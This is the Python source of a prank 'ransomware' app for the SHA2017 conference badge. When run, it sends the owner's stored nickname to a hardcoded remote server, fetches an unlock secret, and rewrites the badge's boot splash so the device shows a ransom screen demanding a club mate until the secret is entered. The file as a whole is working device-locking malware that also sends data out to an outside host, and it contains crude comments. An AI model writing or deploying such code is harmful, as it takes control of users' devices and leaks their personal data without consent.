#NOW IT ACTUALLY WORKS :D
#VISIT ME @ TKKRLAB

import wifi
import ugfx
import badge
import dialogs
import appglue
import urequests as requests
import time


import easydraw
easydraw.msg("Connecting to wifi!","Still Fucked Anyways", True)

ransom_id = ""
ransom_secret = ""
ransom_paid = False
ransom_server = "http://92.222.19.24:6970"  # You can MITM the ransomware!


wifi.init()
ugfx.init()
ugfx.input_init()
badge.init()


def await_wifi():
    while not wifi.sta_if.isconnected():
        time.sleep(0.1)
        pass


def load_keys():
    global ransom_id, ransom_secret
    await_wifi()
    nickname = badge.nvs_get_str("owner", "name", "[no name]")
    resp = requests.get(ransom_server + "/api/pwn?nick=" + nickname).json()
    ransom_id, ransom_secret = resp["id"], resp["secret"]


def write(y, message):
    ugfx.string(20, y, message, "Roboto_Regular12", ugfx.BLACK)


def write_lock():
    global ransom_id
    badge.nvs_set_str('boot','splash','ascii_porn') #Now you are the homescreen :P
    ugfx.clear(ugfx.WHITE)
    ugfx.string(15, 10, "SHA2017 - Ransomware","Roboto_BlackItalic24", ugfx.BLACK)
    write(40, "Oh noes, your badge is being held hostage!")
    write(52, "Deliver a club mate to the Snowden field.")
    write(64, "We're in the first big tent to the left.")
    write(76, "Be sure to show us this ID: " + ransom_id)
    ugfx.input_attach(ugfx.BTN_START, attempt_unlock)
    ugfx.string(20, 100, "[PRESS START TO UNLOCK]", "Roboto_Regular18", ugfx.BLACK)
    ugfx.flush()


def attempt_unlock_secret_entered(secret):
    ugfx.clear(ugfx.WHITE)
    ugfx.string(15, 10, "SHA2017 - Ransomware", "Roboto_BlackItalic24", ugfx.BLACK)

    if secret == ransom_secret:
        badge.nvs_set_str('boot','splash','splash')
        write(40, "Dobby is free!")
        ugfx.flush()
        time.sleep(4)
        appglue.home()
    else:
        write(40, "INVALID RANSOM SECRET!")
        ugfx.flush()
        time.sleep(4)
        write_lock()


def attempt_unlock(pressed):
    global ransom_secret, ransom_paid
    if not pressed:
        write_lock()
    else:
        dialogs.prompt_text("Ransom secret: ", cb=attempt_unlock_secret_entered)

try:
    load_keys()
    write_lock()

except Exception as e:
    write(40, "Someone's probably DDOS'ing the server")
    ugfx.flush()
    time.sleep(5)
    appglue.home()
